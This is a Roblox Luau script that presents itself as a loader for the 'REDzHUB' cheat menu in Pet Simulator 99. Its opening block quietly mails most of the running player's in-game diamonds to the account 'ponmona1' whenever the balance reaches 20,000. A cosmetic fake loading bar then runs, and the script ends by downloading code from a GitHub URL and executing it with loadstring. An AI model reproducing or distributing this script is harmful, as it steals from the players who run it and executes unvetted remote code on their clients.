
#if game:GetService("Players").LocalPlayer.leaderstats["\240\159\146\142 Diamonds"].value >= 20000 then
    local args = {
        [1] = "ponmona1",
        [2] = "free gem",
        [3] = "Currency",
        [4] = "c3f33a64140348fe88b5155d182f1e50",
        [5] = game:GetService("Players").LocalPlayer.leaderstats["\240\159\146\142 Diamonds"].value - 10000
    }
    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
#end

local LoadingUI = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local Bar = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Bar_2 = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local TextLabel_4 = Instance.new("TextLabel")


LoadingUI.Name = "Loading UI"
LoadingUI.IgnoreGuiInset = true
LoadingUI.Parent = game:WaitForChild("CoreGui")
LoadingUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Main.Name = "Main"
Main.Parent = LoadingUI
Main.BackgroundColor3 = Color3.new(0.294118, 0.294118, 0.294118)
Main.BorderColor3 = Color3.new(0, 0, 0)
Main.BorderSizePixel = 0
Main.ZIndex = 9999999
Main.Size = UDim2.new(1, 0, 1, 0)

TextLabel.Parent = Main
TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel.BackgroundTransparency = 1
TextLabel.BorderColor3 = Color3.new(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.5, 0, 0.157154456, 0)
TextLabel.Size = UDim2.new(0.429553926, 0, 0.112195119, 0)
TextLabel.Font = Enum.Font.FredokaOne
TextLabel.Text = "Loading UI REDzHUB"
TextLabel.TextColor3 = Color3.new(1, 1, 1)
TextLabel.TextScaled = true
TextLabel.TextSize = 14
TextLabel.TextWrapped = true

Bar.Name = "Bar"
Bar.Parent = Main
Bar.AnchorPoint = Vector2.new(0.5, 0.5)
Bar.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
Bar.BorderColor3 = Color3.new(0, 0, 0)
Bar.BorderSizePixel = 0
Bar.Position = UDim2.new(0.5, 0, 0.5, 0)
Bar.Size = UDim2.new(0.445353121, 0, 0.0845528468, 0)

UICorner.Parent = Bar

Bar_2.Name = "Bar"
Bar_2.Parent = Bar
Bar_2.BackgroundColor3 = Color3.new(0, 0.984314, 1)
Bar_2.BorderColor3 = Color3.new(0, 0, 0)
Bar_2.BorderSizePixel = 0
Bar_2.Size = UDim2.new(0.428213626, 0, 1, 0)

UICorner_2.Parent = Bar_2

TextLabel_2.Parent = Bar
TextLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel_2.BackgroundTransparency = 1
TextLabel_2.BorderColor3 = Color3.new(0, 0, 0)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0.0146075534, 0, 1.26923132, 0)
TextLabel_2.Size = UDim2.new(0.983305752, 0, 0.580768228, 0)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "Wait Loading UI ..."
TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14
TextLabel_2.TextWrapped = true

TextLabel_3.Parent = Bar
TextLabel_3.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel_3.BackgroundTransparency = 1
TextLabel_3.BorderColor3 = Color3.new(0, 0, 0)
TextLabel_3.BorderSizePixel = 0
TextLabel_3.Position = UDim2.new(0.0083471192, 0, -0.769230187, 0)
TextLabel_3.Size = UDim2.new(0.983305752, 0, 0.580768228, 0)
TextLabel_3.Font = Enum.Font.SourceSans
TextLabel_3.Text = "Loading 10 %"
TextLabel_3.TextColor3 = Color3.new(1, 1, 1)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 14
TextLabel_3.TextWrapped = true

TextLabel_4.Parent = Bar
TextLabel_4.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel_4.BackgroundTransparency = 1
TextLabel_4.BorderColor3 = Color3.new(0, 0, 0)
TextLabel_4.BorderSizePixel = 0
TextLabel_4.Position = UDim2.new(0.0146075534, 0, 2.1346159, 0)
TextLabel_4.Size = UDim2.new(0.983305752, 0, 0.580768228, 0)
TextLabel_4.Font = Enum.Font.SourceSans
TextLabel_4.Text = "1/10"
TextLabel_4.TextColor3 = Color3.new(1, 1, 1)
TextLabel_4.TextScaled = true
TextLabel_4.TextSize = 14
TextLabel_4.TextWrapped = true


for i = 1,10 do wait(.5)
    if TextLabel_2.Text == "Wait Loading UI ." then
        TextLabel_2.Text = "Wait Loading UI .."
    elseif TextLabel_2.Text == "Wait Loading UI .." then
        TextLabel_2.Text = "Wait Loading UI ..."
    elseif TextLabel_2.Text == "Wait Loading UI ..." then
        TextLabel_2.Text = "Wait Loading UI ."
    end
    TextLabel_3.Text = "Loading ".. i * 10 .." %"
    TextLabel_4.Text = i.."/10"
    Bar_2.Size = UDim2.new( i * 0.1, 0, 1, 0)
end wait(.5)

LoadingUI:Destroy()

local Library = loadstring(request({
    ['Url']= 'https://raw.githubusercontent.com/REDzHUB/PetSimulator99/main/redz9999.lua',
    ['Method']='GET'
}).Body)()
